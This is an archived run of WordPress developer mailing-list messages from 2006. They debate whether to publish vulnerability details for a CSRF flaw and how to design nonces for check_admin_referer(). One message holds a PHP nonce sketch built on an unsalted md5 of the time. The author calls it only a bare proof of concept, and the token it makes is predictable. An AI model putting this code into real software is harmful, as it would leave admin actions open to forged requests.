In-Reply-To: <4447FB53.3010408@mullenweg.com>
References: <4447FB53.3010408@mullenweg.com>
Message-ID: <4447FFB8.4090905@tamba2.org.uk>

http://wordpress.org/support/topic/68876?replies=17
This is for those who've been around a while.

In 1.2.1 some people were having themes (or style as it was back then) 
unstyling apparently randomly and IIRC it was a http://example.com and 
http://www.example.com issue. It was then fixed but this thread reminds 
me of that.

One of the original posts was here:
http://wordpress.org/support/topic/14276?replies=10
and there was a patch.

Related?

P.
From mikea at turbonet.com  Thu Apr 20 22:04:19 2006
From: mikea at turbonet.com (Michael D. Adams)
Date: Thu Apr 20 22:09:14 2006
Subject: [Spam] [wp-hackers] Comment # Update
In-Reply-To: <4447FB53.3010408@mullenweg.com>
References: <4447FB53.3010408@mullenweg.com>
Message-ID: <Pine.GSO.4.58.0604201503160.24054@blinky>

On Thu, 20 Apr 2006, Matt Mullenweg wrote:
> When you AJAX approve (or unapprove) a comment on the comment screen or
> edit post screen it bumped the "Awaiting Moderation (x)" number.

Running out the door now, but I've just finished the few lines of JS that
will do this.  Will post to trac this evening.

Michael
From m at mullenweg.com  Thu Apr 20 22:10:38 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Thu Apr 20 22:14:44 2006
Subject: [Spam] [wp-hackers] Comment # Update
In-Reply-To: <Pine.GSO.4.58.0604201503160.24054@blinky>
References: <4447FB53.3010408@mullenweg.com>
	<Pine.GSO.4.58.0604201503160.24054@blinky>
Message-ID: <444806DE.7040900@mullenweg.com>

Michael D. Adams wrote:
> Running out the door now, but I've just finished the few lines of JS that
> will do this.  Will post to trac this evening.

You rock, thanks. :)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From mani.monajjemi at gmail.com  Thu Apr 20 22:15:34 2006
From: mani.monajjemi at gmail.com (Mani Monajjemi)
Date: Thu Apr 20 22:19:37 2006
Subject: [Spam] [wp-hackers] Comment # Update
In-Reply-To: <444806DE.7040900@mullenweg.com>
References: <4447FB53.3010408@mullenweg.com>
	<Pine.GSO.4.58.0604201503160.24054@blinky>
	<444806DE.7040900@mullenweg.com>
Message-ID: <d4d3e29e0604201515t2e795c9t5fe466dc7d5ebfc8@mail.gmail.com>

The same issue is on wordpress.com "invite" page , It's been a while that I
deleted ALL my invites, but when I go to manage panel , I can still see
invites(2) !

On 4/21/06, Matt Mullenweg <m@mullenweg.com> wrote:
>
> Michael D. Adams wrote:
> > Running out the door now, but I've just finished the few lines of JS
> that
> > will do this.  Will post to trac this evening.
>
> You rock, thanks. :)
>
> --
> Matt Mullenweg
>   http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
Mani Monajjemi
www.manionline.org
From wp-hackers at paul-mitchell.me.uk  Thu Apr 20 23:27:14 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Thu Apr 20 23:32:10 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9807D@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9807D@dsimail.drbsystems.com>
Message-ID: <444818D2.50209@paul-mitchell.me.uk>

Brian Layman wrote:
> Oooo - now there's a neat plug in... A rotating blog tag line. Ehhh I bet
> someone made it already...
>   
If not, it's always nice to have some kinda-sorta-similar code to start
with...
http://www.libertini.net/libertus/wordpress-plugins/#respectful-welcome

Paul

From r at schestowitz.com  Fri Apr 21 00:21:00 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Fri Apr 21 00:18:20 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447E1FD.4070106@mullenweg.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>
	<4447C4B9.2040900@ryanduff.net> <4447C83C.2090801@metalab.unc.edu>
	<4447E1FD.4070106@mullenweg.com>
Message-ID: <20060421012100.75e0jcefsn4wo4sk@banana.catalyst2.com>

___/ On Thu 20 Apr 2006 20:33:17 BST, [ Matt Mullenweg ] wrote : \___

> Elliotte Harold wrote:
>> I disagree. Security by obscurity is at best 1 out of 2. Because you 
>> posted the proof of concept I was able to analyze it, understand it, 
>> and figure out how to protect myself against the attack despite a 
>> huge amount of misinformation that continues to be thrown around on 
>> this list. If you hadn't posted the proof of concept, I still 
>> wouldn't understand exactly what the problem is or how to prevent it.
>
> Yes, but the main responsibility of developers is not to Elliotte 
> Harold. Your selfish interests do not coincide with the WP community.


I think this reply is a bit harsh (phrasing that was chosen in haste is
probable), but I tend to agree with the general idea. Protecting oneself
based on a description is something that only a puny userbase cares for, to
say the least.


> I also missed your patch on Trac.
>
> Publishing line-by-line exploits or details about security 
> vulnerabilities when we do a release would help crackers far more 
> than our general user base, which is overwhelmingly non-technical. We 
> get flak about it, but frankly I care far more about our non-savvy 
> and more vulnerable users than security-blinded idealists.


People aspire to get some merit for discovering bugs and reporting them. By
making reports non-public and offering no bounty, you are likely to deter
the required behaviour. Look at them vulnerabilities that are auctioned in
eBay. I am not suggesting that Autommatic should reveal its pocket.


> This is not "security by obscurity," our source code, SVN diffs, and 
> Trac tickets are entirely public, it's just common sense of trying to 
> help your users more than script kiddies.


Security can also be attained by excess and 'noise'. Trac would be hard to
follow and script kiddies won't bother.


> Firefox has a very similar approach.


It does, but let's not pretend that WordPress is on par with Firefox, or
even Apache (pertaining to a previous discussion/rant sparked by Skippy).

Best wishes,

Roy

-- 
Roy S. Schestowitz
http://Schestowitz.com  |    SuSE Linux    ?     PGP-Key: 0x74572E8E
  1:10am  up 43 days 14:53,  6 users,  load average: 0.30, 0.61, 0.72

From sam at rephrase.net  Fri Apr 21 03:18:54 2006
From: sam at rephrase.net (Sam Angove)
Date: Fri Apr 21 03:22:59 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>
Message-ID: <aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>

On 4/21/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
>
> Not to toot my own horn but... this problem is solved and implemented in
> Lyceum, using a security token for every administrative action, which
> results in an identical user experience to wordpress, and allows for
> usage of post or get requests as desired by the programmer. Is there
> anything about this solution that folks don't like?

We wouldn't have spent 100+ messages talking about it if we weren't
interested. Owen listed some reasons why Lyceum's specific method
("b-1") mightn't be desirable, e.g. that it requires server-side
storage. There's talk of making the system pluggable, so Lyceum's
method could be implemented in a plugin if the extra security is
required.
From jjb at ibiblio.org  Fri Apr 21 03:25:14 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Fri Apr 21 03:29:16 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>
	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>
Message-ID: <Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>


On Fri, 21 Apr 2006, Sam Angove wrote:

> Owen listed some reasons why Lyceum's specific method ("b-1") mightn't 
> be desirable, e.g. that it requires server-side storage.

Okay, I guess what I was asking was, what are the drawbacks of b-1, and 
you answered that :)

But what is the drawback of server-side storage?

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From sam at rephrase.net  Fri Apr 21 03:41:08 2006
From: sam at rephrase.net (Sam Angove)
Date: Fri Apr 21 03:45:10 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>
	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>
	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>
Message-ID: <aa74b1910604202041k56f0de0ega4e61a1a0e553171@mail.gmail.com>

On 4/21/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
>
> But what is the drawback of server-side storage?

It's (comparatively) resource-intensive. Why add all those DB writes
if they can be avoided?
From false.hopes at gmail.com  Fri Apr 21 03:42:13 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 03:46:15 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>
	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>
	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>
Message-ID: <a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>

On 4/20/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
>
> But what is the drawback of server-side storage?

Writing to the database is expensive. Here's an example of
computational hashes (very simple) that have a variable lifetime, a
minimum of 12 hours, a maximum of somewhere around 59 hours, the
minimum is easily adjustable, the maximum is slightly harder, but
nothing insurmountable, just requires a bit of math. Obviously, salt
of some sort should be added, action parameters, etc., but this is
just a really, really simple proof of concept.

function generate_nonce() {
        $i = time() / 100000;
        $end = ceil($i);
        if(($i - floor($i)) > .43200)
                $end++;
        return md5($end);
}

function verify_nonce($nonce) {
        $i = ceil(time() / 100000);
        if(md5($i) == $nonce || md5($i + 1) == $nonce)
                return true;
        return false;
}


--
--Robert Deaton
http://somethingunpredictable.com
From filip at filipdewaard.com  Fri Apr 21 04:28:44 2006
From: filip at filipdewaard.com (Filip de Waard)
Date: Fri Apr 21 04:32:51 2006
Subject: [wp-hackers] Importing Serendipity content into Wordpress
Message-ID: <8A8AFB24-4AD0-4F9D-A06A-7F578B3A5C82@filipdewaard.com>

Hello,

As I'm a new user to Wordpress, this is my first post to this list.  
I've just migrated my weblog from Serendipity to Wordpress. Because I  
couldn't find any other way to get my old content into Wordpress,  
I've written an import script that imports the posts and comments and  
preserves the old Serendipity URI's in Wordpress.

The script is a hack - in the bad sense of the word. I needed  
something quick 'n dirty and thats what it turned out to be. I've  
posted the script at http://www.filipdewaard.com/personal/long-time- 
no-see/ (its GNU GPL). Maybe this will help somebody else who is  
planning to migrate. Additionally, it would be nice to add something  
like this to Wordpress. If someone wants to use my script as a  
starting point to write a more mature version or wants to port it to  
the Wordpress API, I would be happy to cooperate.

Just drop me a message if you have any questions or comments about  
the script.

With kind regards,

Filip de Waard
---
http://www.filipdewaard.com


From m at mullenweg.com  Fri Apr 21 05:06:11 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Fri Apr 21 05:10:20 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>
	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>
Message-ID: <44486843.5060304@mullenweg.com>

Robert Deaton wrote:
> Writing to the database is expensive. Here's an example of
> computational hashes (very simple) that have a variable lifetime, a
> minimum of 12 hours, a maximum of somewhere around 59 hours, the
> minimum is easily adjustable, the maximum is slightly harder, but
> nothing insurmountable, just requires a bit of math. Obviously, salt
> of some sort should be added, action parameters, etc., but this is
> just a really, really simple proof of concept.

You get a star for being the first person to post code. :)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 07:32:14 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 07:37:08 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <20060421012100.75e0jcefsn4wo4sk@banana.catalyst2.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>
	<4447C83C.2090801@metalab.unc.edu>	<4447E1FD.4070106@mullenweg.com>
	<20060421012100.75e0jcefsn4wo4sk@banana.catalyst2.com>
Message-ID: <44488A7E.7040907@paul-mitchell.me.uk>

Roy Schestowitz wrote:
> I think this reply is a bit harsh (phrasing that was chosen in haste is
> probable), but I tend to agree with the general idea. Protecting oneself
> based on a description is something that only a puny userbase cares
> for, to
> say the least.
How do you feel about protecting yourself from a real problem that
affects a rather less puny userbase?
http://comox.textdrive.com/pipermail/wp-hackers/2006-April/005704.html

I'm impatient.
http://www.libertini.net/libertus/2006/04/20/repairing-wordpress/

Paul

PS: Real engineers don't need etiquette in their toolkits :)

From elharo at metalab.unc.edu  Fri Apr 21 09:09:31 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Fri Apr 21 09:14:07 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447E1FD.4070106@mullenweg.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>	<4447C83C.2090801@metalab.unc.edu>
	<4447E1FD.4070106@mullenweg.com>
Message-ID: <4448A14B.5010104@metalab.unc.edu>

Matt Mullenweg wrote:

> Yes, but the main responsibility of developers is not to Elliotte 
> Harold. Your selfish interests do not coincide with the WP community.

My "selfish" interest is in seeing that no one can randomly delete posts 
from my blog. I suspect that interest is shared by the vast majority of 
the WordPress community. I'm shocked that you don't seem to agree with 
that.

And I suppose it's quite selfish to take the time to figure out what's 
going on, summarize it, and tell everyone about it. Obviously I should 
have generously kept all the info to myself.

> I also missed your patch on Trac.
> 

I learned a long time ago that it's pointless to submit patches to open 
source projects unless the developers have expressed a prior commitment 
to accepting them. Sometimes when developers are hellbent on driving 90 
miles per hour down the wrong road, you have to wait until they crash 
before they're willing to consider changing course.

The first two actions to be taken here are obvious and not especially 
difficult. (1. Warn the user base not to follow 3rd party links from the 
wp-admin page. 2.  Stop misusing GET.) Instead, the community seems 
focused on complex fixes for other problems that are still vulnerable.

> Publishing line-by-line exploits or details about security 
> vulnerabilities when we do a release would help crackers far more than 
> our general user base, which is overwhelmingly non-technical. We get 
> flak about it, but frankly I care far more about our non-savvy and more 
> vulnerable users than security-blinded idealists.
> 

If you actually did a release this would be fine. You haven't. The bug 
exists. It's out there, and there's no fix available, nor does one seem 
to be likely in the future. Sending private e-mail to 
security@project.org is fine for projects that recognize, respond to, 
and expeditiously fix security holes. However if projects are not 
prepared to treat security seriously, then the information needs to be 
made public so users can take actions to protect themselves when vendors 
can't or won't. This applies whether the project is open or closed 
source. The only difference is it's usually a little easier for third 
parties to patch open source security bugs.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From ryan at boren.nu  Fri Apr 21 11:05:59 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Apr 21 11:10:05 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4448A14B.5010104@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>	<4447C83C.2090801@metalab.unc.edu>	<4447E1FD.4070106@mullenweg.com>
	<4448A14B.5010104@metalab.unc.edu>
Message-ID: <4448BC97.9080107@boren.nu>

Elliotte Harold wrote:
> If you actually did a release this would be fine. You haven't. The bug 
> exists. It's out there, and there's no fix available, nor does one seem 
> to be likely in the future. Sending private e-mail to 
> security@project.org is fine for projects that recognize, respond to, 
> and expeditiously fix security holes. However if projects are not 
> prepared to treat security seriously, then the information needs to be 
> made public so users can take actions to protect themselves when vendors 
> can't or won't. This applies whether the project is open or closed 
> source. The only difference is it's usually a little easier for third 
> parties to patch open source security bugs.

People more interested in helping than ranting have already provided 
patches via the standard mechanism.  Those are being reviewed.  Posting 
exploits and scare mongering only makes our job harder, much harder. 
People don't understand the damage they do with their blog and forum 
screeds.  Public hand-wringing can screw up an entire security release 
train.  A stupid number of hours go into each of our security releases. 
  We have to sift through all of the FUD and vainglorious stupidity and 
snake oil from fly-by-night security "professionals" to find the real 
problems.  We then engage the real professionals who found real problems 
and set about fixing the problem (which is the easy part), verifying the 
fix, and setting up disclosure timelines.  We have to get that fix on 
the train with other fixes and coordinate with Linux distros, hosts, and 
others with a vested interest.  And then someone who thinks their pet 
bug is the end of the world screws up the train.  That's aggravating, 
especially when the bug in question has relatively low exploitability. 
A big, fat dose of perspective is needed in this thread.

Ryan
From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 12:00:02 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 12:05:48 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4448BC97.9080107@boren.nu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>	<4447C83C.2090801@metalab.unc.edu>	<4447E1FD.4070106@mullenweg.com>	<4448A14B.5010104@metalab.unc.edu>
	<4448BC97.9080107@boren.nu>
Message-ID: <4448C942.1000407@paul-mitchell.me.uk>

Ryan Boren wrote:
> A big, fat dose of perspective is needed in this thread.
Oh yes. Like bad poetry, bad code gets you a bad reputation once the
novelty wears off. Expecting enthusiastic users of your product to
remain silent about its flaws whilst praising its merits is na?ve, and
the very reason Customer Service departments were invented!

On a related note, where can I find information about the release
schedule for WordPress 1.5.3? I have one blog I'm not upgrading to 2.0.2
but I would like some official blessing for the security fixes available
for 1.5.2 so that I can confidently incorporate them into that codebase.
I'm not a security professional.

Paul

From ryan at ryanduff.net  Fri Apr 21 15:51:35 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Fri Apr 21 15:55:53 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4448C942.1000407@paul-mitchell.me.uk>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>	<4447C83C.2090801@metalab.unc.edu>	<4447E1FD.4070106@mullenweg.com>	<4448A14B.5010104@metalab.unc.edu>	<4448BC97.9080107@boren.nu>
	<4448C942.1000407@paul-mitchell.me.uk>
Message-ID: <4448FF87.60700@ryanduff.net>

Paul Mitchell wrote:
> I'm not a security professional.
> 
> Paul
> 


He wants a response... he made sure to note he's NOT a security 
"professional"  :P

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From false.hopes at gmail.com  Fri Apr 21 15:59:53 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 16:03:57 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44486843.5060304@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>
	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>
	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>
	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>
	<44486843.5060304@mullenweg.com>
Message-ID: <a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>

On 4/21/06, Matt Mullenweg <m@mullenweg.com> wrote:
> Robert Deaton wrote:
> > Writing to the database is expensive. Here's an example of
> > computational hashes (very simple) that have a variable lifetime, a
> > minimum of 12 hours, a maximum of somewhere around 59 hours, the
> > minimum is easily adjustable, the maximum is slightly harder, but
> > nothing insurmountable, just requires a bit of math. Obviously, salt
> > of some sort should be added, action parameters, etc., but this is
> > just a really, really simple proof of concept.
>
> You get a star for being the first person to post code. :)

Do I get another for being the first to correct it? Or perhaps a gold
star? A smiley face sticker?

s/43200/56800/ in the above

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Fri Apr 21 16:11:05 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 21 16:11:37 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>
	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>
Message-ID: <44490419.80507@midnightcircus.com>

Interested parties should review this ticket:

http://trac.wordpress.org/ticket/2678

Owen


From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 17:02:38 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 17:07:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44490419.80507@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>
	<44490419.80507@midnightcircus.com>
Message-ID: <4449102E.20007@paul-mitchell.me.uk>

Owen Winkler wrote:
> Interested parties should review this ticket:
>
> http://trac.wordpress.org/ticket/2678
Interesting. I'd think twice about sending the DB_PASS to anything other
than the database.

Paul

From ringmaster at midnightcircus.com  Fri Apr 21 17:17:53 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 21 17:18:26 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4449102E.20007@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>	<44490419.80507@midnightcircus.com>
	<4449102E.20007@paul-mitchell.me.uk>
Message-ID: <444913C1.7060507@midnightcircus.com>

Paul Mitchell wrote:
> Interesting. I'd think twice about sending the DB_PASS to anything other
> than the database.

DB_PASS is used throughout WordPress as a unique, private seed for 
generating MD5 hashes.  This case is no different.  Nobody is going to 
get your database password by looking at a generated nonce.

Owen


From Brian at TheCodeCave.com  Fri Apr 21 20:58:19 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 21:02:30 2006
Subject: [wp-hackers] Security at Wordpress
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98080@dsimail.drbsystems.com>

Before I submit some new information, I would like to know who recieves the
emails that go to the Security address.

It will affect my submission.
_______________________________________________
Brian Layman
www.TheCodeCave.com
 


From lists at abhaykumar.net  Fri Apr 21 21:00:39 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Apr 21 21:05:16 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98080@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98080@dsimail.drbsystems.com>
Message-ID: <512061b90604211400t26867cb6t2eee6e1d3abe812e@mail.gmail.com>

> Before I submit some new information, I would like to know who recieves the
> emails that go to the Security address.
You can assume that Matt and Ryan get them. I'm not sure if anyone
else gets them as well.

It does not, however, go out to any of the public lists (like this one).

> It will affect my submission.
I'm not sure what you mean by this but if you would withhold
information, I think that would be somewhat antiproductive, wouldn't
it?

*shrug*

--
Abhay Kumar
http://abhaykumar.net/
From ryan at boren.nu  Fri Apr 21 21:02:49 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Apr 21 21:06:53 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98080@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98080@dsimail.drbsystems.com>
Message-ID: <44494879.5010806@boren.nu>

Brian Layman wrote:
> Before I submit some new information, I would like to know who recieves the
> emails that go to the Security address.

Myself and Matt are on point and a few others on the contributing devs 
list get the emails too.  We wade through all of the cranks and posers 
and forward the stuff needing attention to other regular contributors.

Ryan
From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 21:05:05 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 21:10:07 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444913C1.7060507@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
Message-ID: <44494901.2020008@paul-mitchell.me.uk>

Owen Winkler wrote:
> Paul Mitchell wrote:
>> Interesting. I'd think twice about sending the DB_PASS to anything other
>> than the database.
> DB_PASS is used throughout WordPress as a unique, private seed for
> generating MD5 hashes.  This case is no different.  Nobody is going to
> get your database password by looking at a generated nonce.
Sorry, I'm getting confused. I was thinking of DB_PASSWORD. I can't find
a definition for DB_PASS anywhere in trunk.

Paul

From Brian at TheCodeCave.com  Fri Apr 21 21:07:26 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 21:11:35 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <80ed0cc70604191409w66e0d88y2cef9c28df8e6f1d@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98081@dsimail.drbsystems.com>

>Am I missing something?  Again, why not a random cookie value each time??
Cookies, as rumored, are not secure.  The unique part of the nonce must be
stored in the database.

From ringmaster at midnightcircus.com  Fri Apr 21 21:21:08 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 21 21:20:52 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44494901.2020008@paul-mitchell.me.uk>
